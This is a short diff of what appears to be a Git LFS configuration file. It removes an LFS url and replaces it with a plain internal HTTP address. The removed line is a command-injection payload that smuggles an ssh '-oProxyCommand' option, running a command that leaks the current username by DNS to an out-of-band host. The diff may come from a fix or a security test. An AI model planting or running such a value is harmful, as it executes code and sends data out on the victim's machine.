@@ -1,2 +1,2 @@
 [lfs]
-	url = "ssh://-oProxyCommand=nslookup${IFS}$(whoami).d8dkvmtksss18jjrtu90qubj8z9afzdqh.oast.me/example.com/repo"
+	url = http://gitaly-http:8080/git/projects/22adbc78-adfd-4f40-8c0e-4219ec52888d
